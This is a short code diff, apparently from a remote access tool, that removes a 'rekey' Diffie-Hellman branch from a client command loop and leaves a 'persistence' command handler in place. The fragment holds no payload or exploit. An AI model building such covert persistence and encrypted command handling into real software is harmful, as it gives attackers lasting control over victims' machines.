@@ -55,9 +55,6 @@ def client_loop(conn, dhkey):
             conn.close()
             break
 
-        elif cmd == 'rekey':
-            dhkey = crypto.diffiehellman(conn)
-
         elif cmd == 'persistence':
             results = persistence.run(PLAT)
 
